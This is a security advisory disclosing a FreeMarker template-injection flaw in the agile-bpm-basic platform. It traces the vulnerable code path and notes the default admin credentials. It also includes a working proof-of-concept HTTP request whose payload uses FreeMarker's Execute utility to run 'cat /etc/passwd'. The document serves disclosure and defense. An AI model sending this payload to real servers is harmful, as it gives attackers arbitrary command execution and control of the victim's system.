The agile-bpm-basic system has another high-risk vulnerability that causes RCE due to SSTI vulnerability

# Vulnerability Description

The open source low-code rapid development platform "[agile-bpm/agile-bpm-basic](https://gitee.com/agile-bpm/agile-bpm-basic)" has a FreeMarker SSTI vulnerability that allows attackers to execute arbitrary FreeMarker code to gain full control of the victim's server.

- Vulnerability Discloser: [Honor Cyber Security Lab](https://github.com/honorseclab)

- Vendors: [www.tongzhouyun.com](https://www.tongzhouyun.com/)

- Source code address： [agile-bpm/agile-bpm-basic](https://gitee.com/agile-bpm/agile-bpm-basic)

Related reports online link:

- [https://gitee.com/agile-bpm/agile-bpm-basic/issues/ICAQWG](https://gitee.com/agile-bpm/agile-bpm-basic/issues/ICAQWG)；
- [https://github.com/honorseclab/vulns/blob/main/AgileBPM_agile-bpm-basic/RCE2.md](https://github.com/honorseclab/vulns/blob/main/AgileBPM_agile-bpm-basic/RCE2.md);

Note: 

- **This vulnerability was discovered automatically by my AI code audit tool**.

- The vulnerability is in the latest version code submitted as of 20250526, but the author has not synchronized the release version. According to the public Readme information, it is roughly judged to belong to version v2.8.

# Vulnerability Analysis

The vulnerability code entry point is located at：

- [https://gitee.com/agile-bpm/agile-bpm-basic/blob/master/ab-sys/ab-sys-core/src/main/java/com/dstz/sys/rest/controller/SysToolsController.java#L214](https://gitee.com/agile-bpm/agile-bpm-basic/blob/master/ab-sys/ab-sys-core/src/main/java/com/dstz/sys/rest/controller/SysToolsController.java#L214)

The complete relevant code information of the vulnerability exploit chain is as follows:

```java
// ab-sys\ab-sys-core\src\main\java\com\dstz\sys\rest\controller\SysToolsController.java:parseStrByFreeMarker
    @RequestMapping(value = "parseStrByFreeMarker")
	public ApiResponse<?> parseStrByFreeMarker(@RequestBody ParseStrByFreeMarkerDTO dto) {
		return ApiResponse.success(AbFreemarkUtil.parseByString(dto.getStr(), systemVariableApi.getVariableMap()));  // <-------
	}

// ab-sys\ab-sys-core\src\main\java\com\dstz\sys\rest\model\dto\ParseStrByFreeMarkerDTO.java:getStr
    public String getStr() {
        return str;
    }

// ab-base\ab-base-common\src\main\java\com\dstz\base\common\utils\AbFreemarkUtil.java:parseByString
    public static String parseByString(String templateSource, Object model) {
        return getFreemarkerEngine().parseByString(templateSource, model);  // <-------
    }

// ab-base\ab-base-common\src\main\java\com\dstz\base\common\freemark\impl\FreemarkerEngine.java:parseByString
    @Override
    public String parseByString(String templateSource, Object model) {
        if (model != null && model instanceof Map) {
            //将所有表单生成器的实现类注入到模板引擎中
            Map<String, IFreemarkScript> scirptImpls = SpringUtil.getBeansOfType(IFreemarkScript.class);
            for (Entry<String, IFreemarkScript> scriptMap : scirptImpls.entrySet()) {
                ((Map) model).put(scriptMap.getKey(), scriptMap.getValue());
            }
            model = new freemarker.ext.beans.SimpleMapModel((Map)model, null);
        }

        try {
            Configuration cfg = new Configuration();
            StringTemplateLoader loader = new StringTemplateLoader();
            cfg.setTemplateLoader(loader);
            cfg.setClassicCompatible(true);
            loader.putTemplate("freemaker", templateSource); // <-------
            Template template = cfg.getTemplate("freemaker");
            StringWriter writer = new StringWriter();
            template.process(model, writer);
            return writer.toString();
        } catch (Exception e) {
            LOG.error(String.format("freemaker模板【%s】解析失败：%s", templateSource, e.getMessage()));
            throw new BusinessException(GlobalApiCodes.INTERNAL_ERROR.formatMessage("模板解析失败,可能原因为：{}", ExceptionUtil.getRootCause(e).getMessage()), ExceptionUtil.getRootCause(e));
        }
    }
```

As you can see, the external API ("/parseStrByFreeMarker") receives the value of the externally controllable string variable "str" and passes it directly to the "freemarker.cache.StringTemplateLoader:putTemplate" function for script execution without any verification. This constitutes a complete arbitrary code execution vulnerability, which can be used by attackers to gain control of the victim's server.

# Vulnerability Verification

Please first build the project local environment according to the steps provided by the project source code author in the Readme file. The easiest way is to deploy the environment through containers, which only requires the following two commands:

```shell
docker pull registry.cn-hangzhou.aliyuncs.com/agilebpm/agile-bpm-basic:latest
docker run --name agile-bpm-basic -p 80:80 registry.cn-hangzhou.aliyuncs.com/agilebpm/agile-bpm-basic:latest
```

Then visit the login page through http://ip:80, log in with the default account and password("admin/1"), and obtain a valid "Authorization" request header.

The vulnerability proof of concept (POC) is as follows:

```js
POST /api/ab-bpm/sys/tools/parseStrByFreeMarker HTTP/1.1
Host: 192.168.190.132
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/json;charset=UTF-8
Authorization: Bearer Z9BLIkDvnRe6cW84OCcxXmiyqFk
Content-Length: 100
Origin: http://192.168.190.132
Connection: keep-alive
Referer: http://192.168.190.132/sys/scripts/scriptList
Priority: u=0

{
    "str": "<#assign ex='freemarker.template.utility.Execute'?new()> ${ex('cat /etc/passwd')}"
}
```

After I deployed this project on my Ubuntu virtual machine, I successfully executed the "cat /etc/passwd" command by accessing the API and verified this vulnerability, as shown in the following picture.
![图片](https://github.com/user-attachments/assets/fbe0a4ce-3a15-4da2-8137-e9e0398dc6b5)


# Security Suggestions

Verify the legitimacy of the "str" to be executed to prevent arbitrary code execution from causing the server to be controlled by attackers.
